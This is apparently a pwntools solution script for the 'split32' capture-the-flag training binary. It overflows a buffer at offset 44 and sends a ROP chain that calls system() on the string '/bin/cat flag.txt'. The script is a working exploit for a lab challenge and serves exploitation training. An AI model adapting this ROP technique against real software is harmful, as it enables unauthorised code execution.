#!/usr/bin/python3
from pwn import *
context.binary = 'split32'
p = process('./split32')
for i in range(3):
	print(p.recvline(timeout=1).decode('utf-8'))
# using gdb we found the offset to be 44
offset = 44
r = ROP(context.binary)
# /bin/cat flag.txt is at 0x804a030
r.call(context.binary.sym.plt.system, [0x804a030])
# send the ROP chain
p.sendline(fit({offset:r.chain()}))
#p.interactive()
p.close()
